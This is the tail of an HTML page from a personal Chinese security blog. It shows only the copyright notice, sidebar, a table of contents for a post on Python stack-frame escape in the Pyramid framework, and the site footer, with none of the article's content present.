+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io">Timind</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io/posts/c74d1264/">http://timind-sec.github.io/posts/c74d1264/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://timind-sec.github.io" target="_blank">Timind's café</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Timind</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pyramid%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">pyramid简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E7%86%9F%E6%82%89%E7%9A%84%E9%85%8D%E6%96%B9from-tgctf%E2%80%93web%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">源码分析（熟悉的配方from tgctf–web）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#trick1%EF%BC%9AcheckExpr%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">trick1：checkExpr绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#trick2%EF%BC%9A%E8%B7%AF%E7%94%B1%E7%9A%84%E5%88%9B%E5%BB%BA%E4%BB%A5%E5%8F%8Amain%E6%96%B9%E6%B3%95%E6%A0%88%E5%B8%A7%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">2.2.</span> <span class="toc-text">trick2：路由的创建以及main方法栈帧的获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#final%EF%BC%9Apayload%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">2.3.</span> <span class="toc-text">final：payload的构造</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/c74d1264/" title="浅谈pyramid框架下的栈帧逃逸">浅谈pyramid框架下的栈帧逃逸</a><time datetime="2025-11-07T17:55:14.000Z" title="发表于 2025-11-08 01:55:14">2025-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Timind</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
